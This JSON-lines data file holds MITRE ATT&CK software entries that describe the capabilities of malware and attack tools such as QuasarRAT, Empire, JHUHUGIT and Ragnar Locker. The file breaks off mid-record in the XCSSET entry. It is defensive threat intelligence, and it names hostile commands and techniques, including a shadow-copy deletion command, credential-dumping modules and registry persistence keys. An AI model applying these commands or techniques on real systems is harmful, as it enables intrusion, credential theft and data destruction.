{"text": " [QuasarRAT](https://attack.mitre.org/software/S0262) is an open-source, remote access tool that is publicly available on GitHub. [QuasarRAT](https://attack.mitre.org/software/S0262) is developed in the C# language. (Citation: GitHub QuasarRAT) (Citation: Volexity Patchwork June 2018)", "idx": "https://attack.mitre.org/software/S0262", "title": "QuasarRAT", "entity": "QuasarRAT", "entity_type": "software", "entity_context": ["QuasarRAT can launch a remote shell to execute commands on the victim’s machine.", "QuasarRAT can perform webcam viewing.", "QuasarRAT contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot.", "QuasarRAT can obtain passwords from common FTP clients.", "A QuasarRAT .dll file is digitally signed by a certificate from AirVPN.", "QuasarRAT can download files to the victim’s machine and execute them.", "QuasarRAT uses AES to encrypt network communication.", "QuasarRAT has a built-in keylogger.", "QuasarRAT can communicate over a reverse proxy using SOCKS5.", "QuasarRAT has a module for performing remote desktop access.", "QuasarRAT has a command to edit the Registry on the victim’s machine.", "QuasarRAT can obtain passwords from FTP clients.", "QuasarRAT can obtain passwords from common web browsers.", "QuasarRAT has a command to gather system information from the victim’s machine."], "is_subtechnique": false}
{"text": " [JHUHUGIT](https://attack.mitre.org/software/S0044) is malware used by [APT28](https://attack.mitre.org/groups/G0007). It is based on Carberp source code and serves as reconnaissance malware. (Citation: Kaspersky Sofacy) (Citation: F-Secure Sofacy 2015) (Citation: ESET Sednit Part 1) (Citation: FireEye APT28 January 2017)", "idx": "https://attack.mitre.org/software/S0044", "title": "JHUHUGIT", "entity": "JHUHUGIT", "entity_type": "software", "entity_context": ["JHUHUGIT performs code injection injecting its own functions to browser processes.", "JHUHUGIT has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.", "JHUHUGIT has registered itself as a scheduled task to run each time the current user logs in.", "JHUHUGIT has registered itself as a service to establish persistence.", "The JHUHUGIT dropper can delete itself from the victim. Another JHUHUGIT variant has the capability to delete specified files.", "JHUHUGIT has registered a Windows shell script under the Registry key <code>HKCU\\Environment\\UserInitMprLogonScript</code> to establish persistence.", "A JHUHUGIT variant accesses a screenshot saved in the clipboard and converts it to a JPG image.", "JHUHUGIT obtains a list of running processes on the victim.", "A JHUHUGIT variant takes screenshots by simulating the user pressing the \"Take Screenshot\" key (VK_SCREENSHOT), accessing the screenshot saved in the clipboard, and converting it to a JPG image.", "Many strings in JHUHUGIT are obfuscated with a XOR algorithm.", "JHUHUGIT tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails.", "JHUHUGIT is executed using rundll32.exe.", "JHUHUGIT can retrieve an additional payload from its C2 server. JHUHUGIT has a command to download files to the victim’s machine.", "A JHUHUGIT variant encodes C2 POST data base64.", "A JHUHUGIT variant gathers network interface card information.", "JHUHUGIT uses a .bat file to execute a .dll.", "JHUHUGIT has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A}).", "JHUHUGIT variants have communicated with C2 servers over HTTP and HTTPS.", "JHUHUGIT obtains a build identifier as well as victim hard drive information from Windows registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum</code>. Another JHUHUGIT variant gathers the victim storage volume serial number and the storage device name.", "JHUHUGIT has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges."], "is_subtechnique": false}
{"text": " [Javali](https://attack.mitre.org/software/S0528) is a banking trojan that has targeted Portuguese and Spanish-speaking countries since 2017, primarily focusing on customers of financial institutions in Brazil and Mexico.(Citation: Securelist Brazilian Banking Malware July 2020)", "idx": "https://attack.mitre.org/software/S0528", "title": "Javali", "entity": "Javali", "entity_type": "software", "entity_context": ["Javali can use DLL side-loading to load malicious DLLs into legitimate executables.", "Javali can monitor processes for open browsers and custom banking applications.", "Javali can download payloads from remote C2 servers.", "Javali has been delivered via malicious links embedded in e-mails.", "Javali has achieved execution through victims opening malicious attachments, including MSI files with embedded VBScript.", "Javali can read C2 information from Google Documents and YouTube.", "Javali has used the MSI installer to download and execute malicious payloads.", "Javali has achieved execution through victims clicking links to malicious websites.", "Javali can use large obfuscated libraries to hinder detection and analysis.", "Javali has been delivered as malicious e-mail attachments.", "Javali has used embedded VBScript to download malicious payloads from C2.", "Javali can capture login credentials from open browsers including Firefox, Chrome, Internet Explorer, and Edge."], "is_subtechnique": false}
{"text": " [Final1stspy](https://attack.mitre.org/software/S0355) is a dropper family that has been used to deliver [DOGCALL](https://attack.mitre.org/software/S0213).(Citation: Unit 42 Nokki Oct 2018)", "idx": "https://attack.mitre.org/software/S0355", "title": "Final1stspy", "entity": "Final1stspy", "entity_type": "software", "entity_context": ["Final1stspy uses HTTP for C2.", "Final1stspy obtains a list of running processes.", "Final1stspy creates a Registry Run key to establish persistence.", "Final1stspy obtains victim Microsoft Windows version information and CPU architecture.", "Final1stspy uses Python code to deobfuscate base64-encoded strings.", "Final1stspy obfuscates strings with base64 encoding."], "is_subtechnique": false}
{"text": " [Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1059/001) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)", "idx": "https://attack.mitre.org/software/S0363", "title": "Empire", "entity": "Empire", "entity_type": "software", "entity_context": ["Empire can perform port scans from an infected host.", "Empire has modules to interact with the Windows task scheduler.", "Empire uses a command-line interface to interact with systems.", "Empire can enumerate Security Support Providers (SSPs) as well as utilize PowerSploit's <code>Install-SSP</code> and <code>Invoke-Mimikatz</code> to install malicious SSPs and log authentication events.", "Empire can acquire network configuration information like DNS servers and network proxies used by a host.", "Empire includes various modules for finding files of interest on hosts and network shares.", "Empire can use modules like <code>Invoke-SessionGopher</code> to extract private key and session information.", "Empire can use <code>Invoke-RunAs</code> to make tokens.", "Empire can harvest clipboard data on both Windows and macOS systems.", "Empire can use Dropbox and GitHub for C2.", "Empire contains an implementation of Mimikatz to gather credentials from memory.", "Empire contains a variety of enumeration modules that have an option to use API calls to carry out tasks.", "Empire can conduct command and control over commonly used ports like 80 and 443.", "Empire can exploit vulnerabilities such as MS16-032 and MS16-135.", "Empire has modules for enumerating domain trusts.", "Empire can upload and download to and from a victim machine.", "Empire leverages PowerShell for the majority of its client-side agent tasks. Empire also contains the ability to conduct PowerShell remoting with the <code>Invoke-PSRemoting</code> module.", "Empire can timestomp any files or payloads placed on a target machine to help them blend in.", "Empire can ZIP directories on the target system.", "Empire can capture webcam data on Windows and macOS systems.", "Empire includes various modules to attempt to bypass UAC for escalation of privileges.", "Empire contains modules that can discover and exploit search order hijacking vulnerabilities.", "Empire has modules for executing scripts.", "Empire can use <code>New-GPOImmediateTask</code> to modify a GPO that will install and execute a malicious Scheduled Task/Job.", "Empire has a limited number of built-in modules for exploiting remote SMB, JBoss, and Jenkins servers.", "Empire can enumerate host system information like OS, architecture, applied patches, and more.", "Empire has a module for creating a new domain user if permissions allow.", "Empire can send data gathered from a target through the command and control channel.", "Empire can use PowerSploit's <code>Invoke-TokenManipulation</code> to manipulate access tokens.", "Empire includes keylogging capabilities for Windows, Linux, and macOS systems.", "Empire has the ability to obfuscate commands using <code>Invoke-Obfuscation</code>.", "Empire can add a SID-History to a user if on a domain controller.", "Empire contains modules for executing commands over SSH as well as in-memory VNC agent injection.", "Empire can find information about processes running on local and remote systems.", "Empire can find shared drives on the local system.", "Empire can perform pass the hash attacks.", "Empire can persist by modifying a .LNK file to include a backdoor.", "Empire contains some modules that leverage API hooking to carry out tasks, such as netripper.", "Empire can use Dropbox for data exfiltration.", "Empire has a dylib hijacker module that generates a malicious dylib given the path to a legitimate dylib of a vulnerable application.", "Empire can use PsExec to execute a payload on a remote host.", "Empire can use various modules to search for files containing passwords.", "Empire contains modules that can discover and exploit unquoted path vulnerabilities.", "Empire can be used to conduct packet captures on target hosts.", "Empire can use WMI to deliver a payload to a remote host. ", "Empire can use TLS to encrypt its C2 channel.", "Empire can enumerate the current network connections of a host.", "Empire includes various modules for enumerating Group Policy.", "Empire can leverage its implementation of Mimikatz to obtain and use silver tickets.", "Empire can use GitHub for data exfiltration.", "Empire contains modules that can discover and exploit path interception opportunities in the PATH environment variable.", "Empire contains modules that can discover and exploit various DLL hijacking opportunities.", "Empire has the ability to gather browser data such as bookmarks and visited sites.", "Empire can use modules that extract passwords from common web browsers such as Firefox and Chrome.", "Empire uses PowerSploit's <code>Invoke-Kerberoast</code> to request service tickets and return crackable ticket hashes.", "Empire contains multiple modules for injecting into processes, such as <code>Invoke-PSInject</code>.", "Empire can conduct command and control over protocols like HTTP and HTTPS.", "Empire can utilize built-in modules to modify service binaries and restore them to their original state.", "Empire can acquire local and domain user account information.", "Empire has a module for creating a local user if permissions allow.", "Empire can leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe.", "Empire can utilize <code>Invoke-DCOM</code> to leverage remote COM execution for lateral movement.", "Empire can modify the registry run keys <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.", "Empire can use built-in modules to abuse trusted utilities like MSBuild.exe.\n", "Empire can leverage its implementation of Mimikatz to obtain and use golden tickets.", "Empire is capable of capturing screenshots on Windows and macOS systems.", "Empire can enumerate antivirus software on the target.", "Empire can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.", "Empire has the ability to collect emails on a target system."], "is_subtechnique": false}
{"text": " [Fgdump](https://attack.mitre.org/software/S0120) is a Windows password hash dumper. (Citation: Mandiant APT1)", "idx": "https://attack.mitre.org/software/S0120", "title": "Fgdump", "entity": "Fgdump", "entity_type": "software", "entity_context": ["Fgdump can dump Windows password hashes."], "is_subtechnique": false}
{"text": " [DDKONG](https://attack.mitre.org/software/S0255) is a malware sample that was part of a campaign by [Rancor](https://attack.mitre.org/groups/G0075). [DDKONG](https://attack.mitre.org/software/S0255) was first seen used in February 2017. (Citation: Rancor Unit42 June 2018)", "idx": "https://attack.mitre.org/software/S0255", "title": "DDKONG", "entity": "DDKONG", "entity_type": "software", "entity_context": ["DDKONG lists files on the victim’s machine.", "DDKONG uses Rundll32 to ensure only a single instance of itself is running at once.", "DDKONG decodes an embedded configuration using XOR.", "DDKONG downloads and uploads files on the victim’s machine."], "is_subtechnique": false}
{"text": " [NDiskMonitor](https://attack.mitre.org/software/S0272) is a custom backdoor written in .NET that appears to be unique to [Patchwork](https://attack.mitre.org/groups/G0040). (Citation: TrendMicro Patchwork Dec 2017)", "idx": "https://attack.mitre.org/software/S0272", "title": "NDiskMonitor", "entity": "NDiskMonitor", "entity_type": "software", "entity_context": ["NDiskMonitor obtains the victim username and encrypts the information to send over its C2 channel.", "NDiskMonitor uses AES to encrypt certain information sent over its C2 channel.", "NDiskMonitor obtains the victim computer name and encrypts the information to send over its C2 channel.", "NDiskMonitor can download and execute a file from given URL.", "NDiskMonitor can obtain a list of all files and directories as well as logical drives."], "is_subtechnique": false}
{"text": " [FatDuke](https://attack.mitre.org/software/S0512) is a backdoor used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2016.(Citation: ESET Dukes October 2019)", "idx": "https://attack.mitre.org/software/S0512", "title": "FatDuke", "entity": "FatDuke", "entity_type": "software", "entity_context": ["FatDuke can be controlled via a custom C2 protocol over HTTP.", "FatDuke can AES encrypt C2 communications.", "FatDuke can execute via rundll32.", "FatDuke can copy files and directories from a compromised host.", "FatDuke has the ability to execute PowerShell scripts.", "FatDuke can collect the user name, Windows version, computer name, and available space on discs from a compromised host.", "FatDuke can call <code>ShellExecuteW</code> to open the default browser on the URL localhost.", "FatDuke has attempted to mimic a compromised user's traffic by using the same user agent as the installed browser.", "FatDuke has used <code>HKLM\\SOFTWARE\\Microsoft\\CurrentVersion\\Run</code> to establish persistence.", "FatDuke can use base64 encoding, string stacking, and opaque predicates for obfuscation.", "FatDuke can secure delete its DLL.", "FatDuke can enumerate directories on target machines.", "FatDuke can get user agent strings for the default browser from <code>HKCU\\Software\\Classes\\http\\shell\\open\\command</code>.", "FatDuke can list running processes on the localhost.", "FatDuke can used pipes to connect machines with restricted internet access to remote machines via other infected hosts.", "FatDuke can identify the MAC address on the target computer.", "FatDuke can decrypt AES encrypted C2 communications.", "FatDuke has been regularly repacked by its operators to create large binaries and evade detection.", "FatDuke has used several C2 servers per targeted organization.", "FatDuke has been packed with junk code and strings.", "FatDuke can turn itself on or off at random intervals."], "is_subtechnique": false}
{"text": " [Nidiran](https://attack.mitre.org/software/S0118) is a custom backdoor developed and used by [Suckfly](https://attack.mitre.org/groups/G0039). It has been delivered via strategic web compromise. (Citation: Symantec Suckfly March 2016)", "idx": "https://attack.mitre.org/software/S0118", "title": "Nidiran", "entity": "Nidiran", "entity_type": "software", "entity_context": ["Nidiran can download and execute files.", "Nidiran can create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name.", "Nidiran communicates with its C2 domain over ports 443 and 8443.", "Nidiran can create a new service named msamger (Microsoft Security Accounts Manager)."], "is_subtechnique": false}
{"text": " [SideTwist](https://attack.mitre.org/software/S0610) is a C-based backdoor that has been used by [OilRig](https://attack.mitre.org/groups/G0049) since at least 2021.(Citation: Check Point APT34 April 2021)", "idx": "https://attack.mitre.org/software/S0610", "title": "SideTwist", "entity": "SideTwist", "entity_type": "software", "entity_context": ["SideTwist can execute shell commands on a compromised host.", "SideTwist has exfiltrated data over its C2 channel.", "SideTwist has the ability to upload files from a compromised host.", "SideTwist has used HTTP GET and POST requests over port 443 for C2.", "SideTwist has used Base64 for encoded C2 traffic.", "SideTwist can use <code>GetUserNameW</code>, <code>GetComputerNameW</code>, and <code>GetComputerNameExW</code> to gather information.", "SideTwist can encrypt C2 communications with a randomly generated key.", "SideTwist can embed C2 responses in the source code of a fake Flickr webpage.", "SideTwist can collect the computer name of a targeted system.", "SideTwist can decode and decrypt messages received from C2.", "SideTwist has the ability to download additional files.", "SideTwist has the ability to collect the domain name on a compromised host.", "SideTwist has primarily used port 443 for C2 but can use port 80 as a fallback.", "SideTwist has the ability to search for specific files.", "SideTwist can collect the username on a targeted system."], "is_subtechnique": false}
{"text": " [Net Crawler](https://attack.mitre.org/software/S0056) is an intranet worm capable of extracting credentials using credential dumpers and spreading to systems on a network over SMB by brute forcing accounts with recovered passwords and using [PsExec](https://attack.mitre.org/software/S0029) to execute a copy of [Net Crawler](https://attack.mitre.org/software/S0056). (Citation: Cylance Cleaver)", "idx": "https://attack.mitre.org/software/S0056", "title": "Net Crawler", "entity": "Net Crawler", "entity_type": "software", "entity_context": ["Net Crawler uses PsExec to perform remote service manipulation to execute a copy of itself as part of lateral movement.", "Net Crawler uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement.", "Net Crawler uses credential dumpers such as Mimikatz and Windows Credential Editor to extract cached credentials from Windows systems.", "Net Crawler uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network."], "is_subtechnique": false}
{"text": " [KOMPROGO](https://attack.mitre.org/software/S0156) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050) that is capable of process, file, and registry management. (Citation: FireEye APT32 May 2017)", "idx": "https://attack.mitre.org/software/S0156", "title": "KOMPROGO", "entity": "KOMPROGO", "entity_type": "software", "entity_context": ["KOMPROGO is capable of retrieving information about the infected system.", "KOMPROGO is capable of running WMI queries.", "KOMPROGO is capable of creating a reverse shell."], "is_subtechnique": false}
{"text": " [BONDUPDATER](https://attack.mitre.org/software/S0360) is a PowerShell backdoor used by [OilRig](https://attack.mitre.org/groups/G0049). It was first observed in November 2017 during targeting of a Middle Eastern government organization, and an updated version was observed in August 2018 being used to target a government organization with spearphishing emails.(Citation: FireEye APT34 Dec 2017)(Citation: Palo Alto OilRig Sep 2018)", "idx": "https://attack.mitre.org/software/S0360", "title": "BONDUPDATER", "entity": "BONDUPDATER", "entity_type": "software", "entity_context": ["BONDUPDATER persists using a scheduled task that executes every minute.", "BONDUPDATER uses <code>-windowstyle hidden</code> to conceal a PowerShell window that downloads a payload.", "BONDUPDATER can use DNS and TXT records within its DNS tunneling protocol for command and control.", "BONDUPDATER can download or upload files from its C2 server.", "BONDUPDATER uses a DGA to communicate with command and control servers.", "BONDUPDATER can read batch commands in a file sent from its C2 server and execute them with cmd.exe.", "BONDUPDATER is written in PowerShell."], "is_subtechnique": false}
{"text": " [TEARDROP](https://attack.mitre.org/software/S0560) is a memory-only dropper that was discovered on some victim machines during investigations related to the 2020 SolarWinds cyber intrusion. It was likely used by [APT29](https://attack.mitre.org/groups/G0016) since at least May 2020.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Microsoft Deep Dive Solorigate January 2021)", "idx": "https://attack.mitre.org/software/S0560", "title": "TEARDROP", "entity": "TEARDROP", "entity_type": "software", "entity_context": ["TEARDROP checked that <code>HKU\\SOFTWARE\\Microsoft\\CTF</code> existed before decoding its embedded payload. ", "TEARDROP ran as a Windows service from the <code>c:\\windows\\syswow64</code> folder.", "TEARDROP files had names that resembled legitimate Window file and directory names.", "TEARDROP was decoded using a custom rolling XOR algorithm to execute a customized Cobalt Strike payload.", "TEARDROP created and read from a file with a fake JPG header, and its payload was encrypted with a simple rotating XOR cipher.", "TEARDROP modified the Registry to create a Windows service for itself on a compromised host."], "is_subtechnique": false}
{"text": " [Felismus](https://attack.mitre.org/software/S0171) is a modular backdoor that has been used by [Sowbug](https://attack.mitre.org/groups/G0054). (Citation: Symantec Sowbug Nov 2017) (Citation: Forcepoint Felismus Mar 2017)", "idx": "https://attack.mitre.org/software/S0171", "title": "Felismus", "entity": "Felismus", "entity_type": "software", "entity_context": ["Some Felismus samples use a custom encryption method for C2 traffic that utilizes AES and multiple keys.", "Felismus collects the system information, including hostname and OS version, and sends it to the C2 server.", "Felismus collects the current username and sends it to the C2 server.", "Felismus uses HTTP for C2.", "Some Felismus samples use a custom method for C2 traffic that utilizes Base64.", "Felismus can download files from remote servers.", "Felismus checks for processes associated with anti-virus vendors.", "Felismus has masqueraded as legitimate Adobe Content Management System files.", "Felismus uses command line for execution.", "Felismus collects the victim LAN IP address and sends it to the C2 server."], "is_subtechnique": false}
{"text": " [AdFind](https://attack.mitre.org/software/S0552) is a free command-line query tool that can be used for gathering information from Active Directory.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk and Trickbot January 2019)", "idx": "https://attack.mitre.org/software/S0552", "title": "AdFind", "entity": "AdFind", "entity_type": "software", "entity_context": ["AdFind can enumerate domain users.", "AdFind can extract subnet information from Active Directory.", "AdFind has the ability to query Active Directory for computers.", "AdFind can enumerate domain groups.", "AdFind can gather information about organizational units (OUs) and domain trusts from Active Directory."], "is_subtechnique": false}
{"text": " [EVILNUM](https://attack.mitre.org/software/S0568) is fully capable backdoor that was first identified in 2018. [EVILNUM](https://attack.mitre.org/software/S0568) is used by the APT group [Evilnum](https://attack.mitre.org/groups/G0120) which has the same name.(Citation: ESET EvilNum July 2020)(Citation: Prevailion EvilNum May 2020)", "idx": "https://attack.mitre.org/software/S0568", "title": "EVILNUM", "entity": "EVILNUM", "entity_type": "software", "entity_context": ["EVILNUM has changed the creation date of files.", "EVILNUM can execute commands and scripts through rundll32. ", "EVILNUM can obtain the computer name from the victim's system.", "EVILNUM can upload files over the C2 channel from the infected host. ", "EVILNUM can make modifications to the Regsitry for persistence.", "EVILNUM can achieve persistence through the Registry Run key.", "EVILNUM can download and upload files to the victim's computer.", "EVILNUM has used the Windows Management Instrumentation (WMI) tool to enumerate infected machines.", "EVILNUM can run a remote scriptlet that drops a file and executes it via regsvr32.exe. ", "EVILNUM can harvest cookies and upload them to the C2 server.", "EVILNUM can obtain the username from the victim's machine.", "EVILNUM can search for anti-virus products on the system.", "EVILNUM has used a one-way communication method via GitLab and Digital Point to perform C2.", "EVILNUM has a function called \"DeleteLeftovers\" to remove certain artifacts of the attack."], "is_subtechnique": false}
{"text": " [POWRUNER](https://attack.mitre.org/software/S0184) is a PowerShell script that sends and receives commands to and from the C2 server. (Citation: FireEye APT34 Dec 2017)", "idx": "https://attack.mitre.org/software/S0184", "title": "POWRUNER", "entity": "POWRUNER", "entity_type": "software", "entity_context": ["POWRUNER can use HTTP for C2 communications.", "POWRUNER may collect user account information by running <code>net user /domain</code> or a series of other commands on a victim.", "POWRUNER may collect local group information by running <code>net localgroup administrators</code> or a series of other commands on a victim.", "POWRUNER may collect domain group information by running <code>net group /domain</code> or a series of other commands on a victim.", "POWRUNER can download or upload files from its C2 server.", "POWRUNER may query the Registry by running <code>reg query</code> on a victim.", "POWRUNER may use WMI when collecting information about a victim.", "POWRUNER may collect active network connections by running <code>netstat -an</code> on a victim.", "POWRUNER can capture a screenshot from a victim.", "POWRUNER may collect information about the system by running <code>hostname</code> and <code>systeminfo</code> on a victim.", "POWRUNER is written in PowerShell.", "POWRUNER may enumerate user directories on a victim.", "POWRUNER can use DNS for C2 communications.", "POWRUNER can execute commands from its C2 server.", "POWRUNER may collect process information by running <code>tasklist</code> on a victim.", "POWRUNER can use base64 encoded C2 communications.", "POWRUNER may collect network configuration data by running <code>ipconfig /all</code> on a victim.", "POWRUNER persists through a scheduled task that executes it every minute.", "POWRUNER may collect information about the currently logged in user by running <code>whoami</code> on a victim.", "POWRUNER may collect information on the victim's anti-virus software."], "is_subtechnique": false}
{"text": " [Pisloader](https://attack.mitre.org/software/S0124) is a malware family that is notable due to its use of DNS as a C2 protocol as well as its use of anti-analysis tactics. It has been used by [APT18](https://attack.mitre.org/groups/G0026) and is similar to another malware family, [HTTPBrowser](https://attack.mitre.org/software/S0070), that has been used by the group. (Citation: Palo Alto DNS Requests)", "idx": "https://attack.mitre.org/software/S0124", "title": "Pisloader", "entity": "Pisloader", "entity_type": "software", "entity_context": ["Pisloader has commands to list drives on the victim machine and to list file information for a given directory.", "Pisloader uses DNS as its C2 protocol.", "Pisloader has a command to collect victim system information, including the system name and OS version.", "Pisloader has a command to upload a file to the victim machine.", "Pisloader has a command to collect the victim's IP address.", "Responses from the Pisloader C2 server are base32-encoded.", "Pisloader establishes persistence via a Registry Run key.", "Pisloader uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.", "Pisloader obfuscates files by splitting strings into smaller sub-strings and including \"garbage\" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data."], "is_subtechnique": false}
{"text": " [SHIPSHAPE](https://attack.mitre.org/software/S0028) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)", "idx": "https://attack.mitre.org/software/S0028", "title": "SHIPSHAPE", "entity": "SHIPSHAPE", "entity_type": "software", "entity_context": ["APT30 may have used the SHIPSHAPE malware to move onto air-gapped networks. SHIPSHAPE targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document.", "SHIPSHAPE achieves persistence by creating a shortcut in the Startup folder."], "is_subtechnique": false}
{"text": " [PinchDuke](https://attack.mitre.org/software/S0048) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2008 to 2010. (Citation: F-Secure The Dukes)", "idx": "https://attack.mitre.org/software/S0048", "title": "PinchDuke", "entity": "PinchDuke", "entity_type": "software", "entity_context": ["PinchDuke searches for files created within a certain timeframe and whose file extension matches a predefined list.", "PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated with many sources such as Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, and Internet Explorer. ", "PinchDuke collects user files from the compromised host based on predefined file extensions.", "PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated many sources such as WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP).", "PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated with many sources such as The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, and Microsoft Outlook.", "PinchDuke gathers system configuration information.", "PinchDuke transfers files from the compromised host via HTTP or HTTPS to a C2 server."], "is_subtechnique": false}
{"text": " [LookBack](https://attack.mitre.org/software/S0582) is a remote access trojan written in C++ that was used against at least three US utility companies in July 2019. The TALONITE activity group has been observed using [LookBack](https://attack.mitre.org/software/S0582).(Citation: Proofpoint LookBack Malware Aug 2019)(Citation: Dragos TALONITE)(Citation: Dragos Threat Report 2020)", "idx": "https://attack.mitre.org/software/S0582", "title": "LookBack", "entity": "LookBack", "entity_type": "software", "entity_context": ["LookBack sets up a Registry Run key to establish a persistence mechanism.", "LookBack can kill processes and delete services.", "LookBack has a function that decrypts malicious data.", "LookBack has a C2 proxy tool that masquerades as <code>GUP.exe</code>, which is software used by Notepad++.", "LookBack has used VBA macros in Microsoft Word attachments to drop additional files to the host.", "LookBack can list running processes.", "LookBack executes the <code>cmd.exe</code> command.", "LookBack side loads its communications module as a DLL into the <code>libcurl.dll</code> loader.", "LookBack’s C2 proxy tool sends data to a C2 server over HTTP.", "LookBack removes itself after execution and can delete files on the system.", "LookBack can retrieve file listings from the victim machine.", "LookBack can shutdown and reboot the victim machine.", "LookBack uses a modified version of RC4 for data transfer.", "LookBack uses a custom binary protocol over sockets for C2 communications.", "LookBack can enumerate services on the victim machine.", "LookBack can take desktop screenshots."], "is_subtechnique": false}
{"text": " [Ragnar Locker](https://attack.mitre.org/software/S0481) is a ransomware that has been in use since at least December 2019.(Citation: Sophos Ragnar May 2020)(Citation: Cynet Ragnar Apr 2020)", "idx": "https://attack.mitre.org/software/S0481", "title": "Ragnar Locker", "entity": "Ragnar Locker", "entity_type": "software", "entity_context": ["Before executing malicious code, Ragnar Locker checks the Windows API <code>GetLocaleInfoW</code> and doesn't encrypt files if it finds a former Soviet country.", "Ragnar Locker has used rundll32.exe to execute components of VirtualBox.", "Ragnar Locker may attempt to connect to removable drives and mapped network drives.", "Ragnar Locker encrypts files on the local machine and mapped drives prior to displaying a note demanding a ransom.", "Ragnar Locker can delete volume shadow copies using <code>vssadmin delete shadows /all /quiet</code>.", "Ragnar Locker has used sc.exe to execute a service that it creates.", "Ragnar Locker has attempted to stop services associated with business applications and databases to release the lock on files used by these applications so they may be encrypted.", "Ragnar Locker has been delivered as an unsigned MSI package that was executed with <code>msiexec.exe</code>.", "Ragnar Locker has used regsvr32.exe to execute components of VirtualBox.", "Ragnar Locker has used sc.exe to create a new service for the VirtualBox driver.", "Ragnar Locker has attempted to terminate/stop processes and services associated with endpoint security products.", "Ragnar Locker has used VirtualBox and a stripped Windows XP virtual machine to run itself. The use of a shared folder specified in the configuration enables Ragnar Locker to encrypt files on the host operating system, including files on any mapped drives.", "Ragnar Locker has used cmd.exe and batch scripts to execute commands."], "is_subtechnique": false}
{"text": " [PolyglotDuke](https://attack.mitre.org/software/S0518) is a downloader that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2013. [PolyglotDuke](https://attack.mitre.org/software/S0518) has been used to drop [MiniDuke](https://attack.mitre.org/software/S0051).(Citation: ESET Dukes October 2019)", "idx": "https://attack.mitre.org/software/S0518", "title": "PolyglotDuke", "entity": "PolyglotDuke", "entity_type": "software", "entity_context": ["PolyglotDuke can use a custom algorithm to decrypt strings used by the malware.", "PolyglotDuke can use <code>LoadLibraryW</code> and <code>CreateProcess</code> to load and execute code.", "PolyglotDuke can be executed using rundll32.exe.", "PolyglotDuke has has used HTTP GET requests in C2 communications.", "PolyglotDuke can write encrypted JSON configuration files to the Registry.", "PolyglotDuke can use Twitter, Reddit, Imgur and other websites to get a C2 URL.", "PolyglotDuke can use steganography to hide C2 information in images.", "PolyglotDuke can custom encrypt strings.", "PolyglotDuke can retrieve payloads from the C2 server."], "is_subtechnique": false}
{"text": " [XCSSET](https://attack.mitre.org/software/S0658) is a macOS modular backdoor that targets Xcode application developers. [XCSSET](https://attack.mitre.org/software/S0658) was first observed in August 2020 and has been used to install a backdoor component, modify browser applications, conduct collection, and provide ransomware-like encryption capabilities.(Citation: trendmicro xcsset xcode project 2020)", "idx": "https://attack.mitre.org/software/S0658", "title": "XCSSET", "entity": "XCSSET", "entity_type": "software", "entity_context": ["XCSSET saves a screen capture of the victim's system with a numbered filename and <code>.jpg</code> extension. Screen captures are taken at specified intervals based on the system. ", "XCSSET adds malicious code to a host's Xcode projects by enumerating CocoaPods <code>target_integrator.rb</code> files under the <code>/Library/Ruby/Gems</code> folder or enumerates all <code>.xcodeproj</code> folders under a given directory. XCSSET then downloads a script and Mach-O file into the Xcode project folder.", "XCSSET has used a zero-day exploit in the ssh launchdaemon to elevate privileges and bypass SIP.", "XCSSET uses <code>scp</code> to access the <code>~/Library/Cookies/Cookies.binarycookies</code> file.", "XCSSET attempts to discover accounts from various locations such as a user's Evernote, AppleID, Telegram, Skype, and WeChat data.", "XCSSET prompts the user to input credentials using a native macOS dialog box leveraging the system process <code>/Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment</code>.", "XCSSET uses AppleScript to check the host's language and location with the command <code>user locale of (get 